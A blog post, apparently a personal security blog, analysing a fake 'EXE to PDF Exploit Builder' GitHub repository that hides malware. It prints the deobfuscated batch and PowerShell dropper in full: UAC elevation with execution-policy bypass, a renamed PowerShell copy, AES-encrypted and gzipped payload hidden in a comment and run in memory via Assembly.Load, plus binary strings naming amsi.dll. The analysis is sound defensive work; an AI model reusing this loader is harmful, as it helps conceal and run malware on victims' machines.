<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Analyzing Simple Powershell Malware | Connected</title>
<meta name=keywords content="powershell,malware,obfuscation"><meta name=description content="Story of how I examined some basic powershell malware I happened to stumble into on github."><meta name=author content="ayedaemon"><link rel=canonical href=https://ayedaemon.github.io/post/2022/08/analyzing-simple-powershell-malware/><link crossorigin=anonymous href=/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U+6hYRq/Ez/nm5vg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://ayedaemon.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ayedaemon.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ayedaemon.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://ayedaemon.github.io/apple-touch-icon.png><link rel=mask-icon href=https://ayedaemon.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Analyzing Simple Powershell Malware"><meta property="og:description" content="Story of how I examined some basic powershell malware I happened to stumble into on github."><meta property="og:type" content="article"><meta property="og:url" content="https://ayedaemon.github.io/post/2022/08/analyzing-simple-powershell-malware/"><meta property="article:section" content="post"><meta property="article:published_time" content="2022-08-30T17:55:02+05:30"><meta property="article:modified_time" content="2023-11-23T22:32:16+05:30"><meta property="og:site_name" content="Connected"><meta name=twitter:card content="summary"><meta name=twitter:title content="Analyzing Simple Powershell Malware"><meta name=twitter:description content="Story of how I examined some basic powershell malware I happened to stumble into on github."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ayedaemon.github.io/post/"},{"@type":"ListItem","position":2,"name":"Analyzing Simple Powershell Malware","item":"https://ayedaemon.github.io/post/2022/08/analyzing-simple-powershell-malware/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Analyzing Simple Powershell Malware","name":"Analyzing Simple Powershell Malware","description":"Story of how I examined some basic powershell malware I happened to stumble into on github.","keywords":["powershell","malware","obfuscation"],"articleBody":"What is a malware? Malware, a portmanteu meaning malicious software, refers to any program that was created with the specific goal of doing harm. Your digital environment is vulnerable to a variety of terrible things, including attempts to compromise your computer or network, leak confidential data, and gain illegal access. These issues can occasionally be brought on by common software defects, but when malware is to blame, it poses a major risk to online users and businesses.\nYes, a virus is a malware.. Malware is an umbrella term, with virus being just one of types among many others.\nCommon obfuscation techniques? Obfuscation is a software engineering technique used by hackers and security teams mainly to conceal the written code. There are different motivations to use obfuscation, but their aim is the same ‚Äì to make the source code unintelligible, difficult to comprehend, and interpret.\nFew of the common obfuscatons techniques involve\nDead-code insertion Code flow obfuscation Variable renaming String encryption etc.. Journey begins! I always like trying out new tools and understanding how they work behind the scenes. And about time I got my eyes on a github repo that said EXE TO PDF Exploit Builder.\nThis was enough to make me open the repo and look more into it. üòÅ\nLucifer on github This repo was owned by Luci441‚Ä¶ But for some reasons this looked suspecious to me.\nThe account is only few days old. The owner claims to be the owner of Hackforums. And it only had 6 followers‚Ä¶. Hackforum twitter account had 11.2K Followers at the time of writing this blog. Anyways, I was more interested into looking how that EXE to PDF program worked. So I moved directly to the repo and looked at the source code. The README contained something that made me more suspecious‚Ä¶\nWhy make such a tool obfuscated?? Why no VMs supported?? Who makes such a tool and intentionally make it unusable in VMs?\nAnd there is no how to get started section with this tool so I‚Äôll have to read the code and understand it. Good heavens‚Ä¶ Finally I got started with the ExploitBuilder.bat file to read the source code.\nThere are a lot of things that raise doubt, but that‚Äôs not what why you are here. Are you?\nSimplifying initial payload After taking a look at all the files inside the repo, it was safe to assume that there was absolutely no need of the C header files (.h files). This was just to make everything a bit more convincing.\nFirst thing first, I forked the repo and removed all the extra files. The forked repo can be found here -\u003e https://github.com/ayedaemon/Exe-to-pdf. Interestingly, there was a Pull Request to the original repo that mentioned about the malware it contained. But I won‚Äôt talk about it and ruin the journey ;)\nMost interesting file in the whole repo was the batchfile and it was obfuscated. The whole thing was divided into multiple variables and then the complete command was constructed at runtime by concatinating those jumbled strings. I gotta admit there is a lot one can do with strings nowadays.\nI cleaned most of the lines with sed and then printed them with python. Maybe there is a faster and better way to clean it.. I‚Äôll be happy to hear if you have any alternative ways to do it easily.\nHere is the python notebook that shows the initial deobfuscation. ‚Äì\u003e https://github.com/ayedaemon/Exe-to-pdf/blob/main/notebook.ipynb\nAfter this, I had the clean payload that was much much easier to read. Here is the clean payload ‚Äì\u003e https://github.com/ayedaemon/Exe-to-pdf/blob/main/clean_payload.txt\n@echo off net file if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas \u0026 exit /b ) cd /d %1 copy C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /y %~dp0%~nx0.exe' cls cd %~dp0 %~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $eaqcw = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine);foreach ($VtoBl in $eaqcw) { if ($VtoBl.StartsWith(':: ')) { $BMjJe = $VtoBl.Substring(3); break; }; };$VGGCQ = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($BMjJe);$hbvqO = New-Object System.Security.Cryptography.AesManaged;$hbvqO.Mode = [System.Security.Cryptography.CipherMode]::CBC;$hbvqO.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$hbvqO.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=');$hbvqO.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('E55hmIoW8UIQx1ajzTvfAA==');$CfOAS = $hbvqO.CreateDecryptor();$VGGCQ = $CfOAS.TransformFinalBlock($VGGCQ, 0, $VGGCQ.Length);$CfOAS.Dispose();$hbvqO.Dispose();$YVjlv = New-Object System.IO.MemoryStream(, $VGGCQ);$iJFSw = New-Object System.IO.MemoryStream;$uwkaq = New-Object System.IO.Compression.GZipStream($YVjlv, [IO.Compression.CompressionMode]::Decompress);$uwkaq.CopyTo($iJFSw);$uwkaq.Dispose();$YVjlv.Dispose();$iJFSw.Dispose();$VGGCQ = $iJFSw.ToArray();$WtHIs = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($VGGCQ);$iFZWS = $WtHIs.EntryPoint;$iFZWS.Invoke($null, (, [string[]] ('%*'))) exit /b Let‚Äôs try and understand this script line by line‚Ä¶ just like an interpreter üòâ\n@echo off prevents the prompt and contents of the batch file from being displayed, so that only the output is visible. The @ makes the output of the echo off command hidden as well. If you are into bad things or preventing bad things to happen - this is like a defacto starting command for all batch scripts.\nnet file without any extra argumnents this displays all the open shared files on a server and the lock-ids (if any). I‚Äôm not completely sure why this is used but anyways\nThen it checks errorlevel, it is not 0 then it‚Äôll run some powershell command. I‚Äôm not very good with windows and it‚Äôs tools at this point but it is very clear that is executing something with -ep bypass to prevent any warnings or prompts. Sus it is, isn‚Äôt it?\nAfter changing directory (where it can put all his mess, without being sus), it copies the powershell binary and saves it with another name.\nClears the screen to remove all the output generated. Above tasks will be in a flash and you probably will just see a blink on terminal if you have Veronica Seider‚Äôs Super Power. Bad Joke, I know.\nEventually, it‚Äôll use the copied \u0026 renamed powershell to run some -command with -ep bypass flag. After a bit of google-fu I got to know about few common techniques used to bypass powershell execution policy. I found this blog 1 concise and helpful for the same topic.\nde-obfuscating powershell I copied the powershell -command to another file, just to make more sense of it. And it looked better than before.\n$eaqcw = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine); foreach ($VtoBl in $eaqcw) { if ($VtoBl.StartsWith(':: ')) { $BMjJe = $VtoBl.Substring(3); break; }; }; $VGGCQ = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($BMjJe); $hbvqO = New-Object System.Security.Cryptography.AesManaged; $hbvqO.Mode = [System.Security.Cryptography.CipherMode]::CBC; $hbvqO.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $hbvqO.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4='); $hbvqO.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('E55hmIoW8UIQx1ajzTvfAA=='); $CfOAS = $hbvqO.CreateDecryptor(); $VGGCQ = $CfOAS.TransformFinalBlock($VGGCQ, 0, $VGGCQ.Length); $CfOAS.Dispose(); $hbvqO.Dispose(); $YVjlv = New-Object System.IO.MemoryStream(, $VGGCQ); $iJFSw = New-Object System.IO.MemoryStream; $uwkaq = New-Object System.IO.Compression.GZipStream($YVjlv, [IO.Compression.CompressionMode]::Decompress); $uwkaq.CopyTo($iJFSw); $uwkaq.Dispose(); $YVjlv.Dispose(); $iJFSw.Dispose(); $VGGCQ = $iJFSw.ToArray(); $WtHIs = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($VGGCQ); $iFZWS = $WtHIs.EntryPoint; $iFZWS.Invoke($null, (, [string[]] ('%*'))) If I did not mention this earlier, I‚Äôm not good with windows OS and powershell scripting, but with decent knowledge about programming/scripting languages and a text editor of choice, it was not so hard to make this code understandable. De-obfuscated file can be found on github here -\u003e https://github.com/ayedaemon/Exe-to-pdf/blob/main/powershell_command_deobfuscated.txt\n## Read the initial payload file $payload = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('/ExploitBuilder.bat').Split([Environment]::NewLine); ## Get the line starting with `:: `; This also acts as the comment in batch scripting foreach ($each_line in $payload) { if ($each_line.StartsWith(':: ')) { $comment_line = $each_line.Substring(3); break; }; }; ## Decode the comment line with \"Military grade AES encryption\" $decoded_comment_line = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($comment_line); $cryptObj = New-Object System.Security.Cryptography.AesManaged; $cryptObj.Mode = [System.Security.Cryptography.CipherMode]::CBC; $cryptObj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $cryptObj.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4='); $cryptObj.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('E55hmIoW8UIQx1ajzTvfAA=='); $decryptObj = $cryptObj.CreateDecryptor(); $decrypted_comment_line = $decryptObj.TransformFinalBlock($decoded_comment_line, 0, $decoded_comment_line.Length); $decryptObj.Dispose(); $cryptObj.Dispose(); ## Shuffle the data throught memory streams and decompress it (gzip decompression) $decrypted_stream = New-Object System.IO.MemoryStream(, $decrypted_comment_line); $extra_stream = New-Object System.IO.MemoryStream; $ungzip_decrypted_stream = New-Object System.IO.Compression.GZipStream($decrypted_stream, [IO.Compression.CompressionMode]::Decompress); $ungzip_decrypted_stream.CopyTo($extra_stream); $ungzip_decrypted_stream.Dispose(); $decrypted_stream.Dispose(); $extra_stream.Dispose(); ## Load the final binary and execute it $asm = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($decrypted_array); $asm_entrypoint = $asm.EntryPoint; $asm_entrypoint.Invoke($null, (, [string[]] ('%*'))) There are tons of obfuscation techniques that can be used by a hacker or a professional, but the final goal is common - To make it harder to read and interpret. Here is a blog by Offensive-Security on powershell obfuscation 2 that helped me to gain knowledge about how powershell malwares are usually obfuscated.\nThis malware specifically used some good techniques:-\nchanging the variable names to random characters String reversal techniques for powershell commands. Key based cryptography to encrypt the malicious payload. Compressing the payload to prevent detection Decompressing in memory streams to make it somewhat fileless and hard to detect. ‚Ä¶but the method employed to hide the payload in comments actually astounded me.\nWindows EXE file There were several steps within a single line powershell command, that were eventually loading and executing the actual malware. Instead of writing my own functions to reverse engineer everything the author has done, I took the lazy approach and let his code do most of the work‚Ä¶and just before the loading \u0026 execution segment, I dumped the binary. ü§≠\n## Dump exe file before loading and executing $result = [System.Text.Encoding]::UTF8.GetString($extra_stream.ToArray()) $result \u003e extra_stream.exe.txt How I know it is an EXE file? ‚Ä¶Simply by looking at the magic numbers of the obtained file\nAll the obfuscation, just to make sure that this exe file gets executed. ü§¶ Well, now it‚Äôs time to analyze the binary file we just extracted and see if we can figure out the truth about this EXE-to-pdf program. For this, I quickly launched up radare2 3 in another terminal and started analysing the file. Why Radare2?? I prefer stayting in the terminal‚Ä¶And it is an amazing tool :)\nWhat does all Reverse Engineering 101 books say?? - grab some basic info about the binary file and dump all strings to support the existing hypothesis and build on it.\nSo I did that..\nBasic info\nfile extra_stream.exe.txt size 0x409f humansz 16.2K minopsz 1 maxopsz 16 invopsz 1 mode r-x format any iorw false block 0x100 Strings (omitted)\n211 0x0000271a 0x0000271a 20 21 ascii BJEtuQtQCkWlpTOkRPdJ 212 0x0000272f 0x0000272f 20 21 ascii OzLDUBlAcSBIOPOJLBlh 213 0x00002744 0x00002744 20 21 ascii BDltEFgkoicgcKNaARhF 214 0x00002759 0x00002759 20 21 ascii QvYrospzbuUnUAXNVABe 215 0x0000276e 0x0000276e 20 21 ascii joIOHkxVlAiZHoYgFUel 316 0x00002ce8 0x00002ce8 14 15 ascii RuntimeHelpers 317 0x00002cf7 0x00002cf7 5 6 ascii Array 318 0x00002cfd 0x00002cfd 18 19 ascii RuntimeFieldHandle 319 0x00002d10 0x00002d10 15 16 ascii InitializeArray 320 0x00002d20 0x00002d20 19 20 ascii $$method0x6000003-2 321 0x00002d34 0x00002d34 7 8 ascii UIntPtr 322 0x00002d3c 0x00002d3c 11 12 ascii op_Explicit 323 0x00002d48 0x00002d48 4 5 ascii Copy 324 0x00002d4d 0x00002d4d 17 18 ascii System.Reflection 325 0x00002d5f 0x00002d5f 8 9 ascii Assembly 326 0x00002d68 0x00002d68 20 21 ascii GetExecutingAssembly 327 0x00002d7d 0x00002d7d 24 25 ascii GetManifestResourceNames 328 0x00002d96 0x00002d96 13 14 ascii WriteAllBytes 329 0x00002da4 0x00002da4 16 17 ascii System.Threading 330 0x00002db5 0x00002db5 11 12 ascii ThreadStart 331 0x00002dc1 0x00002dc1 6 7 ascii Thread 332 0x00002dc8 0x00002dc8 4 5 ascii Char 333 0x00002dcd 0x00002dcd 5 6 ascii Split 334 0x00002dd3 0x00002dd3 4 5 ascii Load 335 0x00002dd8 0x00002dd8 10 11 ascii MethodInfo 336 0x00002de3 0x00002de3 14 15 ascii get_EntryPoint 337 0x00002df2 0x00002df2 10 11 ascii MethodBase 338 0x00002dfd 0x00002dfd 16 17 ascii ProcessStartInfo 339 0x00002e0e 0x00002e0e 6 7 ascii Concat 340 0x00002e15 0x00002e15 13 14 ascii set_Arguments 341 0x00002e23 0x00002e23 18 19 ascii ProcessWindowStyle 342 0x00002e36 0x00002e36 15 16 ascii set_WindowStyle 343 0x00002e46 0x00002e46 18 19 ascii set_CreateNoWindow 344 0x00002e59 0x00002e59 12 13 ascii set_FileName 345 0x00002e66 0x00002e66 11 12 ascii System.Core 346 0x00002e72 0x00002e72 28 29 ascii System.Security.Cryptography 347 0x00002e8f 0x00002e8f 10 11 ascii AesManaged 348 0x00002e9a 0x00002e9a 18 19 ascii SymmetricAlgorithm 349 0x00002ead 0x00002ead 10 11 ascii CipherMode 350 0x00002eb8 0x00002eb8 8 9 ascii set_Mode 351 0x00002ec1 0x00002ec1 11 12 ascii PaddingMode 352 0x00002ecd 0x00002ecd 11 12 ascii set_Padding 353 0x00002ed9 0x00002ed9 16 17 ascii ICryptoTransform 354 0x00002eea 0x00002eea 15 16 ascii CreateDecryptor 355 0x00002efa 0x00002efa 19 20 ascii TransformFinalBlock 356 0x00002f0e 0x00002f0e 12 13 ascii MemoryStream 357 0x00002f1b 0x00002f1b 21 22 ascii System.IO.Compression 358 0x00002f31 0x00002f31 10 11 ascii GZipStream 359 0x00002f3c 0x00002f3c 6 7 ascii Stream 360 0x00002f43 0x00002f43 15 16 ascii CompressionMode 361 0x00002f53 0x00002f53 6 7 ascii CopyTo 362 0x00002f5a 0x00002f5a 7 8 ascii ToArray 363 0x00002f62 0x00002f62 25 26 ascii GetManifestResourceStream 364 0x00002f7c 0x00002f7c 11 12 ascii payload.exe 365 0x00002f8a 0x00002f8a 34 69 utf16le Select * from Win32_ComputerSystem 373 0x00003070 0x00003070 44 89 utf16le Ok++WI0tak7DdF3uV9x+8O7wJaTIlfxMVTMno9KXut4= 374 0x000030ca 0x000030ca 44 90 utf16le +uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc= 375 0x00003124 0x00003124 24 49 utf16le WTltvoM17r/Ehimm8ynucg== 376 0x00003156 0x00003156 44 89 utf16le amZLVSQJiUQKj6Rv/kTQ8kyn+kGd0mUv6VK0wS/w3/E= 377 0x000031b0 0x000031b0 14 29 utf16le VirtualProtect 378 0x000031ce 0x000031ce 8 18 utf16le amsi.dll 379 0x000031e0 0x000031e0 24 49 utf16le WG/Dged0cIrjNUQv5M9ONw== 380 0x00003212 0x00003212 9 20 utf16le ntdll.dll 381 0x00003226 0x00003226 24 50 utf16le KMgwS70BP93VTwRv09KJTQ== 382 0x00003258 0x00003258 24 50 utf16le ZoHIhlSGD8rN6cc5D8M/MA== 383 0x0000328a 0x0000328a 24 49 utf16le shwnMnkYp+bePn1r9fIgQg== 384 0x000032c3 0x000032c3 63 127 utf16le MNbxejM5jxzm3r5TKG6sPhlK6QF/D8w6/aOC8lz9bfMr26dy72cAJCSoDcBoN3Q 385 0x00003343 0x00003343 9 19 utf16le \" \u0026 del \" 386 0x0000335b 0x0000335b 7 16 utf16le cmd.exe There are base64 encoded strings, interesting function calls and interesting strings in this binary, which I can look up and figure out what this file does. It will be so easy!!\nBut to my surprise, it was not at all easy‚Ä¶ Or maybe I‚Äôm just not worthy yet.\nAll the base64 strings are not readable. Although I‚Äôve a feeling that these strings are used in similar fashion as they were used in previous powershell payload.\nEven after looking in the memory area where the intriguing strings are pointed, I was unable to find anything that made sense to me.\n[0x00002f70]\u003e pd 20 ; CODE XREF from fcn.00000000 @ +0x2f01 0x00002f70 6f outsd dx, dword [rsi] ‚îå‚îÄ\u003c 0x00002f71 7572 jne 0x2fe5 ‚îÇ 0x00002f73 636553 movsxd rsp, dword [rbp + 0x53] ‚îå‚îÄ‚îÄ\u003c 0x00002f76 7472 je 0x2fea ‚îÇ‚îÇ 0x00002f78 65 invalid ‚îÇ‚îÇ 0x00002f79 61 invalid ‚îÇ‚îÇ 0x00002f7a 6d insd dword [rdi], dx ‚îÇ‚îÇ 0x00002f7b 007061 add byte [rax + 0x61], dh ‚îå‚îÄ‚îÄ‚îÄ\u003c 0x00002f7e 796c jns 0x2fec ‚îÇ‚îÇ‚îÇ 0x00002f80 6f outsd dx, dword [rsi] ‚îÇ‚îÇ‚îÇ 0x00002f81 61 invalid ‚îå‚îÄ‚îÄ‚îÄ‚îÄ\u003c 0x00002f82 642e657865 js 0x2fec ‚îÇ‚îÇ‚îÇ‚îÇ 0x00002f87 0000 add byte [rax], al ‚îÇ‚îÇ‚îÇ‚îÇ ; CODE XREFS from fcn.00000000 @ +0x2f15, +0x2f34 ‚îÇ‚îÇ‚îÇ‚îÇ 0x00002f89 4553 push r11 ‚îÇ‚îÇ‚îÇ‚îÇ 0x00002f8b 006500 add byte [rbp], ah ‚îÇ‚îÇ‚îÇ‚îÇ 0x00002f8e 6c insb byte [rdi], dx ‚îÇ‚îÇ‚îÇ‚îÇ 0x00002f8f 006500 add byte [rbp], ah ‚îÇ‚îÇ‚îÇ‚îÇ 0x00002f92 6300 movsxd rax, dword [rax] ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\u003c 0x00002f94 7400 je 0x2f96 ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ ; CODE XREF from fcn.00000000 @ +0x2f94 ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\u003e 0x00002f96 2000 and byte [rax], al Then I looked at the color patterns to figure out if it had repeated patterns‚Ä¶ I could then take it as a sign that this binary is itself encoded.\nNext Steps? There are numerous indicators right now that point to the possibility that this is malware, but who am I to judge? (based on what I currently understand about Windows malware analysis)\nFor now, I just have a few leads to pursue, but maybe in the future I‚Äôll figure it all the way down and find out exactly what this program does. Till then‚Ä¶\nhttps://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/¬†‚Ü©Ô∏é\nhttps://www.offensive-security.com/offsec/powershell-obfuscation/¬†‚Ü©Ô∏é\nhttps://rada.re/n/radare2.html¬†‚Ü©Ô∏é\n","wordCount":"2429","inLanguage":"en","datePublished":"2022-08-30T17:55:02+05:30","dateModified":"2023-11-23T22:32:16+05:30","author":[{"@type":"Person","name":"ayedaemon"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://ayedaemon.github.io/post/2022/08/analyzing-simple-powershell-malware/"},"publisher":{"@type":"Organization","name":"Connected","logo":{"@type":"ImageObject","url":"https://ayedaemon.github.io/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://ayedaemon.github.io/ accesskey=h title="Connected (Alt + H)">Connected</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://ayedaemon.github.io/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://ayedaemon.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://ayedaemon.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://ayedaemon.github.io/series/ title=Series><span>Series</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://ayedaemon.github.io/>Home</a>&nbsp;¬ª&nbsp;<a href=https://ayedaemon.github.io/post/>Posts</a></div><h1 class=post-title>Analyzing Simple Powershell Malware</h1><div class=post-description>Story of how I examined some basic powershell malware I happened to stumble into on github.</div><div class=post-meta><span title='2022-08-30 17:55:02 +0530 +0530'>August 30, 2022</span>&nbsp;¬∑&nbsp;12 min&nbsp;¬∑&nbsp;2429 words&nbsp;¬∑&nbsp;ayedaemon&nbsp;|&nbsp;<a href=https://github.com/ayedaemon/ayedaemon.github.io/tree/main/content/post/2022/08/Analyzing-Simple-Powershell-Malware.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#what-is-a-malware>What is a malware?</a></li><li><a href=#common-obfuscation-techniques>Common obfuscation techniques?</a></li><li><a href=#journey-begins>Journey begins!</a></li><li><a href=#next-steps>Next Steps?</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h3 id=what-is-a-malware>What is a malware?<a hidden class=anchor aria-hidden=true href=#what-is-a-malware>#</a></h3><p>Malware, a <a href=https://en.wikipedia.org/wiki/Portmanteau>portmanteu</a> meaning malicious software, refers to any program that was created with the specific goal of doing harm.
Your digital environment is vulnerable to a variety of terrible things, including attempts to compromise your computer or network, leak confidential data, and gain illegal access. These issues can occasionally be brought on by common software defects, but when malware is to blame, it poses a major risk to online users and businesses.</p><p><em>Yes, a virus is a malware</em>.. Malware is an umbrella term, with virus being just one of types among <a href=https://en.wikipedia.org/wiki/Malware#Types>many others</a>.</p><h3 id=common-obfuscation-techniques>Common obfuscation techniques?<a hidden class=anchor aria-hidden=true href=#common-obfuscation-techniques>#</a></h3><p>Obfuscation is a software engineering technique used by hackers and security teams mainly to conceal the written code. There are different motivations to use obfuscation, but their aim is the same ‚Äì to make the source code unintelligible, difficult to comprehend, and interpret.</p><p>Few of the common obfuscatons techniques involve</p><ul><li>Dead-code insertion</li><li>Code flow obfuscation</li><li>Variable renaming</li><li>String encryption</li><li>etc..</li></ul><h3 id=journey-begins>Journey begins!<a hidden class=anchor aria-hidden=true href=#journey-begins>#</a></h3><p>I always like trying out new tools and understanding how they work behind the scenes. And about time I got my eyes on a <a href=https://github.com/luci61/Exe-to-pdf>github repo that said <strong>EXE TO PDF Exploit Builder</strong></a>.</p><p>This was enough to make me open the repo and look more into it. üòÅ</p><h4 id=lucifer-on-github>Lucifer on github<a hidden class=anchor aria-hidden=true href=#lucifer-on-github>#</a></h4><p>This repo was owned by <a href=https://github.com/luci61><code>Luci441</code></a>&mldr; But for some reasons this looked suspecious to me.</p><p><img loading=lazy src=https://i.imgur.com/KWaUh7B.png#center alt></p><ol><li>The account is only few days old.</li><li>The owner claims to be the owner of <a href=https://twitter.com/hackforumsnet>Hackforums</a>.</li><li>And it only had 6 followers&mldr;. Hackforum twitter account had 11.2K Followers at the time of writing this blog.</li></ol><p>Anyways, I was more interested into looking how that <strong>EXE to PDF</strong> program worked. So I moved directly to the repo and looked at the source code. The README contained something that made me more suspecious&mldr;</p><p><img loading=lazy src=https://i.imgur.com/FTFCzTv.png#center alt></p><p>Why make such a tool obfuscated?? Why no VMs supported?? Who makes such a tool and intentionally make it unusable in VMs?</p><p>And there is no <em>how to get started</em> section with this tool so I&rsquo;ll have to read the code and understand it. Good heavens&mldr; Finally I got started with the <a href=https://github.com/luci61/Exe-to-pdf/blob/main/ExploitBuilder.bat><code>ExploitBuilder.bat</code></a> file to read the source code.</p><p><em>There are a lot of things that raise doubt, but that&rsquo;s not what why you are here. Are you?</em></p><h4 id=simplifying-initial-payload>Simplifying initial payload<a hidden class=anchor aria-hidden=true href=#simplifying-initial-payload>#</a></h4><p>After taking a look at all the files inside the repo, it was safe to assume that there was absolutely no need of the C header files (.h files). This was just to make everything a bit more convincing.</p><p>First thing first, I forked the repo and removed all the extra files. The forked repo can be found here -> <a href=https://github.com/ayedaemon/Exe-to-pdf>https://github.com/ayedaemon/Exe-to-pdf</a>. <em>Interestingly, there was a <a href=https://github.com/luci61/Exe-to-pdf/pull/2/commits/9731946651866c7ea8ec5c5cbe654a979b51c55f>Pull Request</a> to the original repo that mentioned about the malware it contained. But I won&rsquo;t talk about it and ruin the journey</em> ;)</p><p>Most interesting file in the whole repo was the batchfile and it was obfuscated. The whole thing was divided into multiple variables and then the complete command was constructed at runtime by concatinating those jumbled strings. <em>I gotta admit there is a lot one can do with strings nowadays.</em></p><p>I cleaned most of the lines with <code>sed</code> and then printed them with <code>python</code>. Maybe there is a faster and better way to clean it.. I&rsquo;ll be happy to hear if you have any alternative ways to do it easily.</p><p>Here is the python notebook that shows the initial deobfuscation. &ndash;> <a href=https://github.com/ayedaemon/Exe-to-pdf/blob/main/notebook.ipynb>https://github.com/ayedaemon/Exe-to-pdf/blob/main/notebook.ipynb</a></p><p>After this, I had the clean payload that was much much easier to read. Here is the clean payload &ndash;> <a href=https://github.com/ayedaemon/Exe-to-pdf/blob/main/clean_payload.txt>https://github.com/ayedaemon/Exe-to-pdf/blob/main/clean_payload.txt</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>@echo off
</span></span><span class=line><span class=cl>net file
</span></span><span class=line><span class=cl>if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath &#39;%0&#39; -ArgumentList &#39;%cd%&#39; -Verb runas &amp; exit /b )
</span></span><span class=line><span class=cl>cd /d %1
</span></span><span class=line><span class=cl>copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /y %~dp0%~nx0.exe&#39;
</span></span><span class=line><span class=cl>cls
</span></span><span class=line><span class=cl>cd %~dp0
</span></span><span class=line><span class=cl>%~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $eaqcw = [System.IO.File]::(&#39;txeTllAdaeR&#39;[-1..-11] -join &#39;&#39;)(&#39;%~f0&#39;).Split([Environment]::NewLine);foreach ($VtoBl in $eaqcw) { if ($VtoBl.StartsWith(&#39;:: &#39;)) {  $BMjJe = $VtoBl.Substring(3); break; }; };$VGGCQ = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)($BMjJe);$hbvqO = New-Object System.Security.Cryptography.AesManaged;$hbvqO.Mode = [System.Security.Cryptography.CipherMode]::CBC;$hbvqO.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$hbvqO.Key = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)(&#39;wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=&#39;);$hbvqO.IV = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)(&#39;E55hmIoW8UIQx1ajzTvfAA==&#39;);$CfOAS = $hbvqO.CreateDecryptor();$VGGCQ = $CfOAS.TransformFinalBlock($VGGCQ, 0, $VGGCQ.Length);$CfOAS.Dispose();$hbvqO.Dispose();$YVjlv = New-Object System.IO.MemoryStream(, $VGGCQ);$iJFSw = New-Object System.IO.MemoryStream;$uwkaq = New-Object System.IO.Compression.GZipStream($YVjlv, [IO.Compression.CompressionMode]::Decompress);$uwkaq.CopyTo($iJFSw);$uwkaq.Dispose();$YVjlv.Dispose();$iJFSw.Dispose();$VGGCQ = $iJFSw.ToArray();$WtHIs = 